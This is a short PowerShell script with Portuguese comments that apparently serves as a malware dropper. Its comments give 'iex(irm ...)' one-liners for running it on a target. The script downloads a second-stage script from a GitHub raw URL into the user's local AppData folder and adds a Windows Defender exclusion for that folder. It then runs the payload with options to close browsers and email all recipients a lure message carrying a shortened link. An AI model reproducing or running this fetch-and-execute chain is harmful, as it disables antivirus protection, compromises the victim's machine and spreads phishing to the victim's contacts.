# reho.ps1 - runner: baixa a versao ATUAL do rehot.ps1 do GitHub e dispara a campanha.
# Disparo no alvo (cmd):  powershell -c "iex(irm 'https://raw.githubusercontent.com/SagazBeiramar/stl/refs/heads/main/reho.ps1')"
# Disparo no alvo (ps):   iex(irm 'https://raw.githubusercontent.com/SagazBeiramar/stl/refs/heads/main/reho.ps1')
$ErrorActionPreference = 'Stop'

$d = Join-Path $env:LOCALAPPDATA 'rehot'
$t = Join-Path $d 'rehot.ps1'
if (-not (Test-Path $d)) { New-Item -ItemType Directory -Force $d | Out-Null }
if (Test-Path $t) { Remove-Item $t -Force }   # nunca reusa arquivo velho

$u = 'https://raw.githubusercontent.com/SagazBeiramar/stl/refs/heads/main/rehot.ps1'
try {
    Invoke-WebRequest $u -OutFile $t -UseBasicParsing
} catch {
    Write-Output 'FALHA: download do rehot.ps1 nao completou (404/403/rede)'
    exit 1
}

Unblock-File $t
Add-MpPreference -ExclusionPath $d -ErrorAction SilentlyContinue
& $t -CloseBrowsers -ToAllRecipients -Subject 'Retorno Documento Solicitado' -Body 'Conforme solicitado aqui esta o documento que voce me pediu https://encurtador.com.br/YYaR'
